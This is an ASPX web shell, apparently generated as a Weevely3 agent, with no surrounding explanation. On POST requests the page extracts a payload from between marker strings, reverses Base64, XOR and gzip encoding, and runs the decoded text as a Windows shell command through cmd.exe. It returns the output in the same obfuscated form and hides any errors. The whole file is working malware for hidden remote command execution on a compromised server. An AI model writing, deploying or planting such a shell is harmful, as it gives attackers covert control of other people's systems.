b'\n\n<%@ Page Language="C#" Debug="true" Trace="false" %>\n<%@ Import Namespace="System.Diagnostics" %>\n<%@ Import Namespace="System.IO" %>\n<%@ Import Namespace="System.IO.Compression" %>\n<%@ Import Namespace="System.Text" %>\n\n<script runat="server">\n    // Weevely3 ASPX Agent\n    // Implements the obfuscated communication protocol:\n    // Request: Base64 -> XOR -> Gunzip -> Execute\n    // Response: Output -> Gzip -> XOR -> Base64\n\n    private string Xor(string text, string key)\n    {\n        StringBuilder sb = new StringBuilder();\n        for (int i = 0; i < text.Length; i++)\n        {\n            sb.Append((char)(text[i] ^ key[i % key.Length]));\n        }\n        return sb.ToString();\n    }\n\n    private string StreamToString(Stream stream)\n    {\n        using (StreamReader reader = new StreamReader(stream, Encoding.GetEncoding("ISO-8859-1")))\n        {\n            return reader.ReadToEnd();\n        }\n    }\n\n    private byte[] StringToBytes(string text)\n    {\n        return Encoding.GetEncoding("ISO-8859-1").GetBytes(text);\n    }\n    \n    private string BytesToString(byte[] bytes)\n    {\n        return Encoding.GetEncoding("ISO-8859-1").GetString(bytes);\n    }\n\n    protected void Page_Load(object sender, EventArgs e)\n    {\n        // Password hash parts injected by generator\n        string k = "5f4dcc3b"; \n        string kh = "5aa765d61d83";\n        string kf = "27deb882cf99";\n        string p = "Tk137xf9DBWB5Od7";\n\n        if (Request.HttpMethod == "POST")\n        {\n            try\n            {\n                // Read raw body\n                string input;\n                using (StreamReader reader = new StreamReader(Request.InputStream, Encoding.GetEncoding("ISO-8859-1")))\n                {\n                    input = reader.ReadToEnd();\n                }\n\n                int start = input.IndexOf(kh);\n                int end = input.IndexOf(kf);\n\n                if (start != -1 && end != -1)\n                {\n                    string payload = input.Substring(start + kh.Length, end - (start + kh.Length));\n\n                    // Decode: Base64 -> XOR -> Gunzip\n                    byte[] decodedBytes = Convert.FromBase64String(payload);\n                    string xorred = BytesToString(decodedBytes);\n                    string unxorred = Xor(xorred, k);\n\n                    string cmd = "";\n                    using (MemoryStream ms = new MemoryStream(StringToBytes(unxorred)))\n                    using (GZipStream gzip = new GZipStream(ms, CompressionMode.Decompress))\n                    using (StreamReader reader = new StreamReader(gzip, Encoding.GetEncoding("ISO-8859-1")))\n                    {\n                        cmd = reader.ReadToEnd();\n                    }\n\n                    // Execute Command\n                    ProcessStartInfo psi = new ProcessStartInfo();\n                    psi.FileName = "cmd.exe";\n                    psi.Arguments = "/c " + cmd;\n                    psi.RedirectStandardOutput = true;\n                    psi.RedirectStandardError = true;\n                    psi.UseShellExecute = false;\n                    psi.CreateNoWindow = true;\n\n                    Process proc = Process.Start(psi);\n                    string output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();\n                    proc.WaitForExit();\n\n                    // Encode: Gzip -> XOR -> Base64\n                    string compressed = "";\n                    using (MemoryStream ms = new MemoryStream())\n                    {\n                        using (GZipStream gzip = new GZipStream(ms, CompressionMode.Compress))\n                        {\n                            byte[] outputBytes = StringToBytes(output);\n                            gzip.Write(outputBytes, 0, outputBytes.Length);\n                        }\n                        compressed = BytesToString(ms.ToArray());\n                    }\n\n                    string reXorred = Xor(compressed, k);\n                    string encoded = Convert.ToBase64String(StringToBytes(reXorred));\n\n                    Response.Write(p + kh + encoded + kf);\n                }\n            }\n            catch (Exception ex)\n            {\n                // Silent fail or debug\n                // Response.Write(ex.ToString());\n            }\n        }\n    }\n</script>\n'
